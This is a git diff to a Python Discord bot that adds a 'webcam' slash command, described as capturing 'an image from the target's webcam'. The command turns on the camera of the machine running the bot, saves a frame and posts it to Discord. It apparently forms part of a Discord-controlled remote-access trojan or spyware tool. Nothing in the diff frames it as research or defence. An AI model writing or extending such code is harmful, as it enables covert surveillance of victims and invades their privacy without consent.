@@ -1,8 +1,10 @@
 import discord
 import os
-# import aiofiles
+import asyncio
 from dotenv import load_dotenv
 from discord.ext import commands
+# import aiofiles
+import webcam
 
 load_dotenv()
 
@@ -60,6 +62,18 @@ class View(discord.ui.View):
 async def myButton(interaction: discord.Interaction):
     await interaction.response.send_message(view=View())
 
+@client.tree.command(name="webcam", description="Capture an image from the target's webcam", guild=GUILD_ID)
+async def showcam(interaction: discord.Interaction):
+    await interaction.response.defer()  # Defer the response to avoid timeout
+    cam = webcam.webcam()
+    activ, retcode = await cam.activate()
+    if type(activ) != str:
+        imgsaved = await cam.save(activ)
+        print(imgsaved)
+        await cam.release(activ)
+        await interaction.followup.send(file=discord.File(cam.out_name))
+    else:
+        await interaction.followup.send(content="Failed to activate webcam: " + retcode)
 
 token = os.getenv('DISCORD_BOT_TOKEN')
 client.run(token)
